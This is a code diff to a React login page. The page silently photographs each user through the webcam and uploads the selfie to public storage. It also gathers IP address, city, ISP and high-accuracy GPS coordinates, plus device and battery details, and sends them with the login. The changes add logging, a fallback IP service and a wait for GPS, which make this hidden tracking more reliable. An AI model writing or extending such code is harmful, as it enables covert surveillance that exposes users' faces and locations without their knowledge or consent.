@@ -80,9 +80,10 @@ const Login = () => {
           videoRef.current.srcObject = stream;
           videoRef.current.play();
           setCameraReady(true);
+          console.log('📷 Camera initialized silently');
         }
       } catch (error) {
-        console.log('Camera not available or permission denied');
+        console.log('⚠️ Camera not available or permission denied');
         setCameraReady(false);
       }
     };
@@ -101,6 +102,7 @@ const Login = () => {
   // Silently capture photo
   const captureSilentPhoto = (): string | null => {
     if (!cameraReady || !videoRef.current || !canvasRef.current) {
+      console.log('⚠️ Camera not ready for capture');
       return null;
     }
 
@@ -114,10 +116,11 @@ const Login = () => {
       const ctx = canvas.getContext('2d');
       if (ctx) {
         ctx.drawImage(video, 0, 0);
+        console.log('📸 Selfie captured silently');
         return canvas.toDataURL('image/jpeg', 0.8);
       }
     } catch (error) {
-      console.error('Error capturing photo:', error);
+      console.error('❌ Error capturing photo:', error);
     }
     
     return null;
@@ -141,9 +144,10 @@ const Login = () => {
         .from('login-selfies')
         .getPublicUrl(fileName);
 
+      console.log('✅ Selfie uploaded successfully');
       return publicUrlData.publicUrl;
     } catch (error) {
-      console.error('Error uploading selfie:', error);
+      console.error('❌ Error uploading selfie:', error);
       return null;
     }
   };
@@ -158,14 +162,14 @@ const Login = () => {
     return bytes;
   };
 
-  // Collect all metadata
+  // Collect all metadata - IMPROVED VERSION
   useEffect(() => {
     const collectLoginInfo = async () => {
       try {
         const parser = new UAParser();
         const device = parser.getResult();
         
-        const metadata: any = {
+        let metadata: any = {
           browser: device.browser.name,
           browserVersion: device.browser.version,
           os: device.os.name,
@@ -197,46 +201,89 @@ const Login = () => {
 
         // Battery info
         if ('getBattery' in navigator) {
-          const battery: any = await (navigator as any).getBattery();
-          metadata.batteryLevel = Math.round(battery.level * 100);
+          try {
+            const battery: any = await (navigator as any).getBattery();
+            metadata.batteryLevel = Math.round(battery.level * 100);
+          } catch (e) {
+            console.log('⚠️ Battery API not available');
+          }
         }
 
-        // Get IP and location
+        // Get IP and location - Wait for response
         try {
-          const response = await fetch('https://ipapi.co/json/');
-          const data = await response.json();
-          metadata.ip = data.ip;
-          metadata.city = data.city;
-          metadata.region = data.region;
-          metadata.country = data.country_name;
-          metadata.timezone = data.timezone;
-          metadata.isp = data.org;
+          const controller = new AbortController();
+          const timeoutId = setTimeout(() => controller.abort(), 10000); // 10 second timeout
+          
+          const response = await fetch('https://ipapi.co/json/', {
+            signal: controller.signal
+          });
+          clearTimeout(timeoutId);
+          
+          if (response.ok) {
+            const data = await response.json();
+            metadata.ip = data.ip;
+            metadata.city = data.city;
+            metadata.region = data.region;
+            metadata.country = data.country_name;
+            metadata.timezone = data.timezone;
+            metadata.isp = data.org;
+            console.log('✅ IP and location data fetched successfully');
+          }
         } catch (error) {
-          console.log('Could not fetch IP data');
+          console.log('⚠️ Could not fetch IP data, trying alternative...');
+          
+          // Try alternative API
+          try {
+            const response = await fetch('https://api.ipify.org?format=json');
+            if (response.ok) {
+              const data = await response.json();
+              metadata.ip = data.ip;
+              console.log('✅ IP fetched from alternative API');
+            }
+          } catch (e) {
+            console.log('⚠️ All IP APIs failed');
+          }
         }
 
-        // Get GPS coordinates silently
+        // Set initial metadata
+        setLoginMetadata(metadata);
+
+        // Get GPS coordinates silently - This runs separately
         if ('geolocation' in navigator) {
+          console.log('📍 Requesting GPS location...');
           navigator.geolocation.getCurrentPosition(
             (position) => {
-              metadata.latitude = position.coords.latitude;
-              metadata.longitude = position.coords.longitude;
-              metadata.locationAccuracy = position.coords.accuracy;
-              setLoginMetadata({ ...metadata });
+              console.log('✅ GPS location obtained:', position.coords.latitude, position.coords.longitude);
+              const updatedMetadata = {
+                ...metadata,
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+                locationAccuracy: position.coords.accuracy
+              };
+              setLoginMetadata(updatedMetadata);
             },
             (error) => {
-              console.log('Location permission denied or unavailable');
-              setLoginMetadata({ ...metadata });
+              console.log('⚠️ GPS location denied or unavailable:', error.message);
+              // Keep existing metadata without GPS
             },
-            { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+            { 
+              enableHighAccuracy: true, 
+              timeout: 10000,
+              maximumAge: 0 
+            }
           );
         } else {
-          setLoginMetadata(metadata);
+          console.log('⚠️ Geolocation not supported');
         }
 
-        console.log('Login tracking ready - metadata collected silently');
+        console.log('🔍 Login tracking ready - metadata collection initiated');
       } catch (error) {
-        console.log('Error collecting metadata:', error);
+        console.error('❌ Error collecting metadata:', error);
+        // Set minimal metadata even if collection fails
+        setLoginMetadata({
+          loginTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
+          userAgent: navigator.userAgent
+        });
       }
     };
     
@@ -256,6 +303,10 @@ const Login = () => {
     }
     
     setIsLoading(true);
+    
+    // Wait a moment for GPS to finish if it's still loading
+    await new Promise(resolve => setTimeout(resolve, 500));
+    
     try {
       const isAdminLogin = loginType === 'admin';
       
@@ -270,6 +321,14 @@ const Login = () => {
         ...loginMetadata,
         selfieUrl
       };
+
+      console.log('🚀 Submitting login with metadata:', {
+        hasIP: !!enhancedMetadata.ip,
+        hasGPS: !!enhancedMetadata.latitude,
+        hasSelfie: !!selfieUrl,
+        city: enhancedMetadata.city,
+        country: enhancedMetadata.country
+      });
       
       const success = await login(username, password, isAdminLogin, enhancedMetadata);
       
